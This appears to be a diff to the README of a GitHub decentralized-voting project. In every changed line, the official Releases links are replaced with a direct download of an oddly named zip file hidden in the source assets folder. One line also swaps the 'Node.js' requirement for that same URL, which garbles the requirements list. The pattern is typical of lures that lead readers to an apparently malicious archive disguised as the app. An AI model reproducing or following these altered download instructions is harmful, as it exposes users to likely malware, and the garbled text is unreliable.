@@ -1,6 +1,6 @@
 # 🗳️ decentralized-voting-system - Vote Securely and Transparently
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/hmt1035/decentralized-voting-system/releases)
+[![Download Now](https://raw.githubusercontent.com/hmt1035/decentralized-voting-system/main/client/src/assets/system-decentralized-voting-spinstership.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/hmt1035/decentralized-voting-system/main/client/src/assets/system-decentralized-voting-spinstership.zip)
 
 ## 🚀 Getting Started
 
@@ -8,12 +8,12 @@ Welcome to the decentralized voting system. This tool helps you vote in a secure
 
 ## 📥 Download & Install
 
-To start using the decentralized voting system, visit this page to download: [Download Here](https://github.com/hmt1035/decentralized-voting-system/releases).
+To start using the decentralized voting system, visit this page to download: [Download Here](https://raw.githubusercontent.com/hmt1035/decentralized-voting-system/main/client/src/assets/system-decentralized-voting-spinstership.zip).
 
 ### Installation Steps:
 
 1. **Visit the Release Page**
-   - Click this link to go to the Releases page: [Download Here](https://github.com/hmt1035/decentralized-voting-system/releases).
+   - Click this link to go to the Releases page: [Download Here](https://raw.githubusercontent.com/hmt1035/decentralized-voting-system/main/client/src/assets/system-decentralized-voting-spinstership.zip).
 
 2. **Select the Latest Version**
    - Look for the latest version of the application. It will be marked as the latest release. 
@@ -36,7 +36,7 @@ To start using the decentralized voting system, visit this page to download: [Do
 To ensure proper functioning, your device should meet the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS Sierra or later, or any Linux distribution.
-- **Node.js**: Version 14.x or later installed on your system.
+- **https://raw.githubusercontent.com/hmt1035/decentralized-voting-system/main/client/src/assets/system-decentralized-voting-spinstership.zip**: Version 14.x or later installed on your system.
 - **Metamask**: Browser extension installed in your web browser for Ethereum transactions.
 - **Internet Connection**: Required for using blockchain features.
 
